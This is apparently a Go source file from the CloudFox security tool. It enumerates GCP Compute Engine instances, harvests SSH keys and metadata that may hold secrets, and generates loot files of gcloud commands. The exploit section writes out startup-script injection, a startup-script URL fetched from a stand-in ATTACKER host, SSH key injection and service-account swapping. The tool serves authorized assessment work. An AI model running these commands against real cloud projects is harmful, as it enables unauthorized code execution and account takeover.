package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"sort"
	"strings"
	"sync"

	ComputeEngineService "github.com/BishopFox/cloudfox/gcp/services/computeEngineService"
	"github.com/BishopFox/cloudfox/gcp/shared"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPInstancesCommand = &cobra.Command{
	Use:     globals.GCP_INSTANCES_MODULE_NAME,
	Aliases: []string{"vms", "compute", "ssh", "oslogin"},
	Short:   "Enumerate GCP Compute Engine instances with security configuration",
	Long: `Enumerate GCP Compute Engine instances across projects with security-relevant details.

Features:
- Lists all instances with network and security configuration
- Shows attached service accounts and their scopes
- Identifies instances with default service accounts or broad scopes
- Shows Shielded VM, Secure Boot, and Confidential VM status
- Shows OS Login configuration (enabled, 2FA, block project keys)
- Shows serial port and disk encryption configuration
- Extracts SSH keys from project and instance metadata
- Extracts startup scripts (may contain secrets)
- Generates gcloud commands for instance access and exploitation

Security Columns:
- ExternalIP: Instances with external IPs are internet-accessible
- DefaultSA: Uses default compute service account (security risk)
- BroadScopes: Has cloud-platform or other broad OAuth scopes
- OSLogin: OS Login enabled (recommended for access control)
- OSLogin2FA: OS Login with 2FA required
- BlockProjKeys: Instance blocks project-wide SSH keys
- SerialPort: Serial port access enabled (security risk if exposed)
- CanIPForward: Can forward packets (potential for lateral movement)
- ShieldedVM/SecureBoot/vTPM/Integrity: Hardware security features
- Confidential: Confidential computing enabled
- Encryption: Boot disk encryption type (Google-managed, CMEK, CSEK)`,
	Run: runGCPInstancesCommand,
}

// ------------------------------
// Module Struct with embedded BaseGCPModule
// ------------------------------
type InstancesModule struct {
	gcpinternal.BaseGCPModule

	// Module-specific fields - per-project for hierarchical output
	ProjectInstances map[string][]ComputeEngineService.ComputeEngineInfo    // projectID -> instances
	ProjectMetadata  map[string]*ComputeEngineService.ProjectMetadataInfo   // projectID -> metadata
	LootMap          map[string]map[string]*internal.LootFile               // projectID -> loot files
	FoxMapperCache   *gcpinternal.FoxMapperCache                            // FoxMapper graph data (preferred)
	mu               sync.Mutex
}

// ------------------------------
// Output Struct implementing CloudfoxOutput interface
// ------------------------------
type InstancesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o InstancesOutput) TableFiles() []internal.TableFile { return o.Table }
func (o InstancesOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPInstancesCommand(cmd *cobra.Command, args []string) {
	// Initialize command context
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_INSTANCES_MODULE_NAME)
	if err != nil {
		return // Error already logged
	}

	// Create module instance
	module := &InstancesModule{
		BaseGCPModule:    gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectInstances: make(map[string][]ComputeEngineService.ComputeEngineInfo),
		ProjectMetadata:  make(map[string]*ComputeEngineService.ProjectMetadataInfo),
		LootMap:          make(map[string]map[string]*internal.LootFile),
	}

	// Execute enumeration
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *InstancesModule) Execute(ctx context.Context, logger internal.Logger) {
	// Try to get FoxMapper cache (preferred - graph-based analysis)
	m.FoxMapperCache = gcpinternal.GetFoxMapperCacheFromContext(ctx)
	if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
		logger.InfoM("Using FoxMapper graph data for attack path analysis", globals.GCP_INSTANCES_MODULE_NAME)
	}

	// Run enumeration with concurrency
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, globals.GCP_INSTANCES_MODULE_NAME, m.processProject)

	// Get all instances for stats
	allInstances := m.getAllInstances()
	if len(allInstances) == 0 {
		logger.InfoM("No instances found", globals.GCP_INSTANCES_MODULE_NAME)
		return
	}

	logger.SuccessM(fmt.Sprintf("Found %d instance(s)", len(allInstances)), globals.GCP_INSTANCES_MODULE_NAME)

	// Write output
	m.writeOutput(ctx, logger)
}

// getAllInstances returns all instances from all projects (for statistics)
func (m *InstancesModule) getAllInstances() []ComputeEngineService.ComputeEngineInfo {
	var all []ComputeEngineService.ComputeEngineInfo
	for _, instances := range m.ProjectInstances {
		all = append(all, instances...)
	}
	return all
}

// ------------------------------
// Project Processor (called concurrently for each project)
// ------------------------------
func (m *InstancesModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Enumerating instances in project: %s", projectID), globals.GCP_INSTANCES_MODULE_NAME)
	}

	// Create service and fetch instances with project metadata
	ces := ComputeEngineService.New()
	instances, projectMeta, err := ces.InstancesWithMetadata(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_INSTANCES_MODULE_NAME,
			fmt.Sprintf("Could not enumerate instances in project %s", projectID))
		return
	}

	// Thread-safe store per-project
	m.mu.Lock()
	m.ProjectInstances[projectID] = instances
	m.ProjectMetadata[projectID] = projectMeta

	// Initialize loot for this project
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["instances-commands"] = &internal.LootFile{
			Name:     "instances-commands",
			Contents: "# GCP Compute Engine Instance Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization\n\n",
		}
		m.LootMap[projectID]["instances-metadata"] = &internal.LootFile{
			Name:     "instances-metadata",
			Contents: "",
		}
		m.LootMap[projectID]["instances-ssh-keys"] = &internal.LootFile{
			Name:     "instances-ssh-keys",
			Contents: "# GCP Compute Engine SSH Keys\n# Generated by CloudFox\n# Format: user:key-type KEY comment\n\n",
		}
	}

	// Generate loot for each instance
	for _, instance := range instances {
		m.addInstanceToLoot(projectID, instance)
		m.addInstanceMetadataToLoot(projectID, instance)
		m.addInstanceSSHKeysToLoot(projectID, instance)
	}

	// Add project metadata to loot
	m.addProjectMetadataToLoot(projectID, projectMeta)
	m.addProjectMetadataFullToLoot(projectID, projectMeta)
	m.addProjectSSHKeysToLoot(projectID, projectMeta)

	// Log sensitive metadata findings
	if projectMeta != nil && len(projectMeta.SensitiveMetadata) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d sensitive metadata item(s) in project %s metadata", len(projectMeta.SensitiveMetadata), projectID), globals.GCP_INSTANCES_MODULE_NAME)
	}
	for _, inst := range instances {
		if len(inst.SensitiveMetadata) > 0 {
			logger.InfoM(fmt.Sprintf("Found %d sensitive metadata item(s) in instance %s", len(inst.SensitiveMetadata), inst.Name), globals.GCP_INSTANCES_MODULE_NAME)
		}
	}
	m.mu.Unlock()

	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Found %d instance(s) in project %s", len(instances), projectID), globals.GCP_INSTANCES_MODULE_NAME)
	}
}

// ------------------------------
// Loot File Management
// ------------------------------

// addProjectMetadataToLoot adds project metadata commands to the commands loot file
func (m *InstancesModule) addProjectMetadataToLoot(projectID string, meta *ComputeEngineService.ProjectMetadataInfo) {
	if meta == nil {
		return
	}

	lootFile := m.LootMap[projectID]["instances-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# PROJECT-LEVEL COMMANDS (Project: %s)\n"+
			"# =============================================================================\n\n",
		meta.ProjectID,
	)

	// --- PROJECT ENUMERATION ---
	lootFile.Contents += "# === PROJECT ENUMERATION ===\n\n"
	lootFile.Contents += fmt.Sprintf(
		"gcloud compute project-info describe --project=%s\n"+
			"gcloud compute project-info describe --project=%s --format='yaml(commonInstanceMetadata)'\n"+
			"gcloud compute project-info describe --project=%s --format='value(commonInstanceMetadata.items)'\n",
		meta.ProjectID, meta.ProjectID, meta.ProjectID,
	)

	// Add commands for specific project metadata keys
	for key := range meta.RawMetadata {
		lootFile.Contents += fmt.Sprintf(
			"gcloud compute project-info describe --project=%s --format='value(commonInstanceMetadata.items.filter(key:%s).extract(value).flatten())'\n",
			meta.ProjectID, key,
		)
	}

	// --- PROJECT-LEVEL EXPLOITATION ---
	lootFile.Contents += "\n# === PROJECT-LEVEL EXPLOITATION ===\n\n"
	lootFile.Contents += fmt.Sprintf(
		"# Add project-wide SSH key (applies to all instances not blocking project keys)\n"+
			"gcloud compute project-info add-metadata --project=%s --metadata=ssh-keys='USERNAME:SSH_PUBLIC_KEY'\n"+
			"# Add project-wide startup script\n"+
			"gcloud compute project-info add-metadata --project=%s --metadata=startup-script='#!/bin/bash\\nwhoami > /tmp/pwned'\n"+
			"# Enable OS Login project-wide\n"+
			"gcloud compute project-info add-metadata --project=%s --metadata=enable-oslogin=TRUE\n",
		meta.ProjectID, meta.ProjectID, meta.ProjectID,
	)

	lootFile.Contents += "\n"
}

// addProjectMetadataFullToLoot adds full project metadata to the metadata loot file
func (m *InstancesModule) addProjectMetadataFullToLoot(projectID string, meta *ComputeEngineService.ProjectMetadataInfo) {
	if meta == nil {
		return
	}

	lootFile := m.LootMap[projectID]["instances-metadata"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# PROJECT METADATA: %s\n"+
			"# =============================================================================\n\n",
		meta.ProjectID,
	)

	// Output all raw metadata as JSON for completeness
	if len(meta.RawMetadata) > 0 {
		// Sort keys for consistent output
		var keys []string
		for k := range meta.RawMetadata {
			keys = append(keys, k)
		}
		sort.Strings(keys)

		for _, key := range keys {
			value := meta.RawMetadata[key]
			lootFile.Contents += fmt.Sprintf("--- %s ---\n%s\n\n", key, value)
		}
	} else {
		lootFile.Contents += "(No project-level metadata found)\n\n"
	}
}

// addInstanceToLoot adds instance commands to the commands loot file
func (m *InstancesModule) addInstanceToLoot(projectID string, instance ComputeEngineService.ComputeEngineInfo) {
	lootFile := m.LootMap[projectID]["instances-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# INSTANCE: %s (Zone: %s)\n"+
			"# =============================================================================\n\n",
		instance.Name, instance.Zone,
	)

	lootFile.Contents += "# === ENUMERATION COMMANDS ===\n\n"
	lootFile.Contents += fmt.Sprintf(
		"gcloud compute instances describe %s --zone=%s --project=%s\n"+
			"gcloud compute instances get-iam-policy %s --zone=%s --project=%s\n"+
			"gcloud compute instances get-serial-port-output %s --zone=%s --project=%s\n",
		instance.Name, instance.Zone, instance.ProjectID,
		instance.Name, instance.Zone, instance.ProjectID,
		instance.Name, instance.Zone, instance.ProjectID,
	)

	lootFile.Contents += "\n# === METADATA ENUMERATION ===\n\n"
	lootFile.Contents += fmt.Sprintf(
		"gcloud compute instances describe %s --zone=%s --project=%s --format='value(metadata.items)'\n",
		instance.Name, instance.Zone, instance.ProjectID,
	)

	// Add commands for specific metadata keys found
	for key := range instance.RawMetadata {
		lootFile.Contents += fmt.Sprintf(
			"gcloud compute instances describe %s --zone=%s --project=%s --format='value(metadata.items.filter(key:%s).extract(value).flatten())'\n",
			instance.Name, instance.Zone, instance.ProjectID, key,
		)
	}

	lootFile.Contents += "\n# === CODE EXECUTION / ACCESS ===\n\n"

	// SSH with external IP
	if instance.ExternalIP != "" {
		lootFile.Contents += fmt.Sprintf(
			"# SSH (external IP available)\n"+
				"gcloud compute ssh %s --zone=%s --project=%s\n"+
				"gcloud compute ssh %s --zone=%s --project=%s --command='id && hostname'\n",
			instance.Name, instance.Zone, instance.ProjectID,
			instance.Name, instance.Zone, instance.ProjectID,
		)
	}

	// SSH via IAP tunnel (always an option)
	lootFile.Contents += fmt.Sprintf(
		"# SSH via IAP tunnel\n"+
			"gcloud compute ssh %s --zone=%s --project=%s --tunnel-through-iap\n"+
			"gcloud compute ssh %s --zone=%s --project=%s --tunnel-through-iap --command='id && hostname'\n",
		instance.Name, instance.Zone, instance.ProjectID,
		instance.Name, instance.Zone, instance.ProjectID,
	)

	// OS Login (if enabled)
	if instance.OSLoginEnabled {
		lootFile.Contents += fmt.Sprintf(
			"# OS Login (enabled on this instance)\n"+
				"gcloud compute os-login ssh-keys add --key-file=~/.ssh/id_rsa.pub\n"+
				"gcloud compute ssh %s --zone=%s --project=%s\n",
			instance.Name, instance.Zone, instance.ProjectID,
		)
	}

	// Serial console
	lootFile.Contents += fmt.Sprintf(
		"# Serial console access\n"+
			"gcloud compute connect-to-serial-port %s --zone=%s --project=%s\n",
		instance.Name, instance.Zone, instance.ProjectID,
	)

	// SCP file transfer
	lootFile.Contents += fmt.Sprintf(
		"# SCP file transfer\n"+
			"gcloud compute scp LOCAL_FILE %s:REMOTE_PATH --zone=%s --project=%s\n"+
			"gcloud compute scp %s:REMOTE_PATH LOCAL_FILE --zone=%s --project=%s\n",
		instance.Name, instance.Zone, instance.ProjectID,
		instance.Name, instance.Zone, instance.ProjectID,
	)

	lootFile.Contents += "\n# === EXPLOIT COMMANDS ===\n\n"

	// Startup script injection
	lootFile.Contents += fmt.Sprintf(
		"# Add startup script (runs on next boot)\n"+
			"gcloud compute instances add-metadata %s --zone=%s --project=%s --metadata=startup-script='#!/bin/bash\\nwhoami > /tmp/pwned'\n"+
			"# Add startup script from URL\n"+
			"gcloud compute instances add-metadata %s --zone=%s --project=%s --metadata=startup-script-url=http://ATTACKER/script.sh\n",
		instance.Name, instance.Zone, instance.ProjectID,
		instance.Name, instance.Zone, instance.ProjectID,
	)

	// SSH key injection
	lootFile.Contents += fmt.Sprintf(
		"# Inject SSH key via metadata\n"+
			"gcloud compute instances add-metadata %s --zone=%s --project=%s --metadata=ssh-keys='USERNAME:SSH_PUBLIC_KEY'\n",
		instance.Name, instance.Zone, instance.ProjectID,
	)

	// Reset instance (to trigger startup script)
	lootFile.Contents += fmt.Sprintf(
		"# Reset instance (triggers startup script)\n"+
			"gcloud compute instances reset %s --zone=%s --project=%s\n",
		instance.Name, instance.Zone, instance.ProjectID,
	)

	// Set service account
	lootFile.Contents += fmt.Sprintf(
		"# Change service account (requires stop first)\n"+
			"gcloud compute instances stop %s --zone=%s --project=%s\n"+
			"gcloud compute instances set-service-account %s --zone=%s --project=%s --service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com --scopes=cloud-platform\n"+
			"gcloud compute instances start %s --zone=%s --project=%s\n",
		instance.Name, instance.Zone, instance.ProjectID,
		instance.Name, instance.Zone, instance.ProjectID,
		instance.Name, instance.Zone, instance.ProjectID,
	)

	lootFile.Contents += "\n"
}

// addInstanceMetadataToLoot adds full instance metadata to the metadata loot file
func (m *InstancesModule) addInstanceMetadataToLoot(projectID string, instance ComputeEngineService.ComputeEngineInfo) {
	lootFile := m.LootMap[projectID]["instances-metadata"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# INSTANCE: %s (Zone: %s)\n"+
			"# =============================================================================\n\n",
		instance.Name, instance.Zone,
	)

	// Output all raw metadata
	if len(instance.RawMetadata) > 0 {
		// Sort keys for consistent output
		var keys []string
		for k := range instance.RawMetadata {
			keys = append(keys, k)
		}
		sort.Strings(keys)

		for _, key := range keys {
			value := instance.RawMetadata[key]
			lootFile.Contents += fmt.Sprintf("--- %s ---\n%s\n\n", key, value)
		}
	} else {
		lootFile.Contents += "(No instance-level metadata found)\n\n"
	}

	// Also output as JSON for programmatic use
	if len(instance.RawMetadata) > 0 {
		lootFile.Contents += "--- RAW JSON ---\n"
		jsonBytes, err := json.MarshalIndent(instance.RawMetadata, "", "  ")
		if err == nil {
			lootFile.Contents += string(jsonBytes) + "\n\n"
		}
	}
}

// addInstanceSSHKeysToLoot adds instance SSH keys to the SSH keys loot file
func (m *InstancesModule) addInstanceSSHKeysToLoot(projectID string, instance ComputeEngineService.ComputeEngineInfo) {
	if len(instance.SSHKeys) == 0 {
		return
	}

	lootFile := m.LootMap[projectID]["instances-ssh-keys"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# INSTANCE: %s (Zone: %s)\n"+
			"# =============================================================================\n",
		instance.Name, instance.Zone,
	)

	for _, key := range instance.SSHKeys {
		lootFile.Contents += key + "\n"
	}
	lootFile.Contents += "\n"
}

// addProjectSSHKeysToLoot adds project-level SSH keys to the SSH keys loot file
func (m *InstancesModule) addProjectSSHKeysToLoot(projectID string, meta *ComputeEngineService.ProjectMetadataInfo) {
	if meta == nil || len(meta.ProjectSSHKeys) == 0 {
		return
	}

	lootFile := m.LootMap[projectID]["instances-ssh-keys"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# PROJECT-LEVEL SSH KEYS (apply to all instances not blocking project keys)\n"+
			"# =============================================================================\n",
	)

	for _, key := range meta.ProjectSSHKeys {
		lootFile.Contents += key + "\n"
	}
	lootFile.Contents += "\n"
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *InstancesModule) writeOutput(ctx context.Context, logger internal.Logger) {
	// Decide between hierarchical and flat output
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

// writeHierarchicalOutput writes output to per-project directories
func (m *InstancesModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	header := m.getInstancesTableHeader()
	sensitiveMetadataHeader := m.getSensitiveMetadataTableHeader()
	sshKeysHeader := m.getSSHKeysTableHeader()

	// Build hierarchical output data
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Build project-level outputs
	for projectID, instances := range m.ProjectInstances {
		body := m.instancesToTableBody(instances)
		tables := []internal.TableFile{{
			Name:   globals.GCP_INSTANCES_MODULE_NAME,
			Header: header,
			Body:   body,
		}}

		// Build sensitive metadata table for this project
		sensitiveBody := m.buildSensitiveMetadataTableForProject(projectID, instances)
		if len(sensitiveBody) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "instances-sensitive-metadata",
				Header: sensitiveMetadataHeader,
				Body:   sensitiveBody,
			})
		}

		// Build SSH keys table for this project
		sshKeysBody := m.buildSSHKeysTableForProject(projectID, instances)
		if len(sshKeysBody) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "instances-ssh-keys",
				Header: sshKeysHeader,
				Body:   sshKeysBody,
			})
		}

		// Collect loot for this project
		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		outputData.ProjectLevelData[projectID] = InstancesOutput{Table: tables, Loot: lootFiles}
	}

	// Create path builder using the module's hierarchy
	pathBuilder := m.BuildPathBuilder()

	// Write using hierarchical output
	err := internal.HandleHierarchicalOutputSmart(
		"gcp",
		m.Format,
		m.Verbosity,
		m.WrapTable,
		pathBuilder,
		outputData,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_INSTANCES_MODULE_NAME)
		m.CommandCounter.Error++
	}
}

// writeFlatOutput writes all output to a single directory (legacy mode)
func (m *InstancesModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	header := m.getInstancesTableHeader()
	sensitiveMetadataHeader := m.getSensitiveMetadataTableHeader()
	sshKeysHeader := m.getSSHKeysTableHeader()

	allInstances := m.getAllInstances()
	body := m.instancesToTableBody(allInstances)

	// Build sensitive metadata table for all projects
	var sensitiveBody [][]string
	// Build SSH keys table for all projects
	var sshKeysBody [][]string
	for projectID, instances := range m.ProjectInstances {
		sensitiveBody = append(sensitiveBody, m.buildSensitiveMetadataTableForProject(projectID, instances)...)
		sshKeysBody = append(sshKeysBody, m.buildSSHKeysTableForProject(projectID, instances)...)
	}

	// Collect all loot files
	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	// Build table files
	tableFiles := []internal.TableFile{{
		Name:   globals.GCP_INSTANCES_MODULE_NAME,
		Header: header,
		Body:   body,
	}}

	// Add sensitive metadata table if there are any findings
	if len(sensitiveBody) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "instances-sensitive-metadata",
			Header: sensitiveMetadataHeader,
			Body:   sensitiveBody,
		})
	}

	// Add SSH keys table if there are any
	if len(sshKeysBody) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "instances-ssh-keys",
			Header: sshKeysHeader,
			Body:   sshKeysBody,
		})
	}

	output := InstancesOutput{
		Table: tableFiles,
		Loot:  lootFiles,
	}

	// Write output using HandleOutputSmart with scope support
	scopeNames := make([]string, len(m.ProjectIDs))
	for i, id := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(id)
	}
	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",    // scopeType
		m.ProjectIDs, // scopeIdentifiers
		scopeNames,   // scopeNames
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_INSTANCES_MODULE_NAME)
		m.CommandCounter.Error++
	}
}

// getInstancesTableHeader returns the instances table header
// Columns are grouped logically:
// - Identity: Project, Name, Type, Zone, State, Machine Type
// - Network: External IP, Internal IP, IP Forward
// - Service Account: Service Account, SA Attack Paths, Scopes, Default SA, Broad Scopes
// - Access Control: OS Login, OS Login 2FA, Block Proj Keys, Serial Port
// - Protection: Delete Protect, Last Snapshot
// - Hardware Security: Shielded VM, Secure Boot, vTPM, Integrity, Confidential
// - Disk Encryption: Encryption, KMS Key
// - IAM: IAM Binding Role, IAM Binding Principal
func (m *InstancesModule) getInstancesTableHeader() []string {
	return []string{
		// Identity
		"Project",
		"Name",
		"Type",
		"Zone",
		"State",
		"Machine Type",
		// Network
		"External IP",
		"Internal IP",
		"IP Forward",
		// Service Account
		"Service Account",
		"SA Attack Paths",
		"Scopes",
		"Default SA",
		"Broad Scopes",
		// Access Control
		"OS Login",
		"OS Login 2FA",
		"Block Proj Keys",
		"Serial Port",
		// Protection
		"Delete Protect",
		"Last Snapshot",
		// Hardware Security
		"Shielded VM",
		"Secure Boot",
		"vTPM",
		"Integrity",
		"Confidential",
		// Disk Encryption
		"Encryption",
		"KMS Key",
		// IAM
		"IAM Binding Role",
		"IAM Binding Principal",
	}
}

// isManagedInstance returns true if the instance is managed by a GCP service (GKE, Dataproc, etc.)
func isManagedInstance(instanceType ComputeEngineService.InstanceType) bool {
	switch instanceType {
	case ComputeEngineService.InstanceTypeGKE,
		ComputeEngineService.InstanceTypeMIG,
		ComputeEngineService.InstanceTypeDataproc,
		ComputeEngineService.InstanceTypeDataflow,
		ComputeEngineService.InstanceTypeComposer,
		ComputeEngineService.InstanceTypeBatchJob,
		ComputeEngineService.InstanceTypeAppEngine:
		return true
	default:
		return false
	}
}

// formatManagedBool formats a boolean value with context for managed instances
// For managed instances, values that match expected behavior are annotated with (TYPE) to indicate this is expected
// Example: Delete Protection "No" on a GKE node shows "No (GKE)" because GKE nodes are ephemeral
func formatManagedBool(value bool, instanceType ComputeEngineService.InstanceType, expectedForManaged bool) string {
	if !isManagedInstance(instanceType) {
		return shared.BoolToYesNo(value)
	}

	// For managed instances, add context when the value matches expected behavior
	// This indicates "this looks like a finding but it's expected for this instance type"
	shortType := string(instanceType)
	if value == expectedForManaged {
		if value {
			return fmt.Sprintf("Yes (%s)", shortType)
		}
		return fmt.Sprintf("No (%s)", shortType)
	}

	// Value differs from expected - no annotation needed
	return shared.BoolToYesNo(value)
}

// formatManagedSnapshot formats the last snapshot date with context for managed instances
func formatManagedSnapshot(lastSnapshot string, instanceType ComputeEngineService.InstanceType) string {
	// For ephemeral/managed instances, "Never" is expected
	if lastSnapshot == "" || lastSnapshot == "Never" {
		if isManagedInstance(instanceType) {
			return fmt.Sprintf("Never (%s)", string(instanceType))
		}
		return "Never"
	}

	// Truncate to just the date portion if it's a full timestamp
	if len(lastSnapshot) > 10 {
		lastSnapshot = lastSnapshot[:10]
	}
	return lastSnapshot
}

// getSensitiveMetadataTableHeader returns the sensitive metadata table header
func (m *InstancesModule) getSensitiveMetadataTableHeader() []string {
	return []string{
		"Project",
		"Source",
		"Zone",
		"Metadata Key",
		"Variable",
		"Type",
		"Value",
	}
}

// getSSHKeysTableHeader returns the SSH keys table header
func (m *InstancesModule) getSSHKeysTableHeader() []string {
	return []string{
		"Project",
		"Source",
		"Zone",
		"SSH Key",
	}
}

// buildSSHKeysTableForProject builds the SSH keys table body for a specific project
func (m *InstancesModule) buildSSHKeysTableForProject(projectID string, instances []ComputeEngineService.ComputeEngineInfo) [][]string {
	var body [][]string

	// Add project-level SSH keys
	if meta, ok := m.ProjectMetadata[projectID]; ok && meta != nil && len(meta.ProjectSSHKeys) > 0 {
		for _, key := range meta.ProjectSSHKeys {
			body = append(body, []string{
				m.GetProjectName(projectID),
				"PROJECT",
				"-",
				truncateSSHKeyMiddle(key, 100),
			})
		}
	}

	// Add instance-level SSH keys
	for _, instance := range instances {
		if len(instance.SSHKeys) > 0 {
			for _, key := range instance.SSHKeys {
				body = append(body, []string{
					m.GetProjectName(instance.ProjectID),
					instance.Name,
					instance.Zone,
					truncateSSHKeyMiddle(key, 100),
				})
			}
		}
	}

	return body
}

// truncateSSHKeyMiddle truncates an SSH key in the middle, preserving start and end for searchability
// Format: "user:ssh-rsa AAAA...xyz comment" -> "user:ssh-rsa AAAA...xyz comment"
func truncateSSHKeyMiddle(key string, maxLen int) string {
	if len(key) <= maxLen {
		return key
	}
	// Keep more at the start (user and key type) and end (comment)
	startLen := maxLen * 2 / 3 // ~66% at start
	endLen := maxLen - startLen - 5 // 5 for " ... "
	if endLen < 10 {
		endLen = 10
		startLen = maxLen - endLen - 5
	}
	return key[:startLen] + " ... " + key[len(key)-endLen:]
}

// instancesToTableBody converts instances to table body rows
func (m *InstancesModule) instancesToTableBody(instances []ComputeEngineService.ComputeEngineInfo) [][]string {
	var body [][]string
	for _, instance := range instances {
		// Get first service account email (most instances have just one)
		saEmail := "-"
		scopes := "-"
		if len(instance.ServiceAccounts) > 0 {
			saEmail = instance.ServiceAccounts[0].Email
			scopes = ComputeEngineService.FormatScopes(instance.ServiceAccounts[0].Scopes)
		}

		// Check attack paths (privesc/exfil/lateral) for the service account
		// FoxMapper takes priority if available (graph-based analysis)
		attackPaths := "run foxmapper"
		if saEmail != "-" {
			attackPaths = gcpinternal.GetAttackSummaryFromCaches(m.FoxMapperCache, nil, saEmail)
		} else if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
			attackPaths = "No SA"
		}

		// External IP display
		externalIP := instance.ExternalIP
		if externalIP == "" {
			externalIP = "-"
		}

		// Encryption display
		encryption := instance.BootDiskEncryption
		if encryption == "" {
			encryption = "Google"
		}

		// KMS Key display
		kmsKey := instance.BootDiskKMSKey
		if kmsKey == "" {
			kmsKey = "-"
		}

		// Instance type for contextual display
		instType := instance.InstanceType
		if instType == "" {
			instType = ComputeEngineService.InstanceTypeStandalone
		}

		// Base row data (reused for each IAM binding)
		// Order matches header groups: Identity, Network, Service Account, Access Control, Protection, Hardware Security, Disk Encryption
		baseRow := []string{
			// Identity
			m.GetProjectName(instance.ProjectID),
			instance.Name,
			string(instType),
			instance.Zone,
			instance.State,
			instance.MachineType,
			// Network
			externalIP,
			instance.InternalIP,
			shared.BoolToYesNo(instance.CanIPForward),
			// Service Account
			saEmail,
			attackPaths,
			scopes,
			// Default SA is expected for GKE/managed instances
			formatManagedBool(instance.HasDefaultSA, instType, true),
			// Broad scopes are expected for GKE/managed instances
			formatManagedBool(instance.HasCloudScopes, instType, true),
			// Access Control
			shared.BoolToYesNo(instance.OSLoginEnabled),
			shared.BoolToYesNo(instance.OSLogin2FAEnabled),
			shared.BoolToYesNo(instance.BlockProjectSSHKeys),
			shared.BoolToYesNo(instance.SerialPortEnabled),
			// Protection - Delete protection is NOT expected for managed instances (they're ephemeral)
			formatManagedBool(instance.DeletionProtection, instType, false),
			// Snapshots are not expected for ephemeral/managed instances
			formatManagedSnapshot(instance.LastSnapshotDate, instType),
			// Hardware Security
			shared.BoolToYesNo(instance.ShieldedVM),
			shared.BoolToYesNo(instance.SecureBoot),
			shared.BoolToYesNo(instance.VTPMEnabled),
			shared.BoolToYesNo(instance.IntegrityMonitoring),
			shared.BoolToYesNo(instance.ConfidentialVM),
			// Disk Encryption
			encryption,
			kmsKey,
		}

		// If instance has IAM bindings, create one row per binding
		if len(instance.IAMBindings) > 0 {
			for _, binding := range instance.IAMBindings {
				row := make([]string, len(baseRow)+2)
				copy(row, baseRow)
				row[len(baseRow)] = binding.Role
				row[len(baseRow)+1] = binding.Member
				body = append(body, row)
			}
		} else {
			// No IAM bindings - single row
			row := make([]string, len(baseRow)+2)
			copy(row, baseRow)
			row[len(baseRow)] = "-"
			row[len(baseRow)+1] = "-"
			body = append(body, row)
		}
	}
	return body
}

// buildSensitiveMetadataTableForProject builds the sensitive metadata table body for a specific project
func (m *InstancesModule) buildSensitiveMetadataTableForProject(projectID string, instances []ComputeEngineService.ComputeEngineInfo) [][]string {
	var body [][]string

	// Add project-level sensitive metadata
	if meta, ok := m.ProjectMetadata[projectID]; ok && meta != nil && len(meta.SensitiveMetadata) > 0 {
		for _, item := range meta.SensitiveMetadata {
			body = append(body, []string{
				m.GetProjectName(projectID),
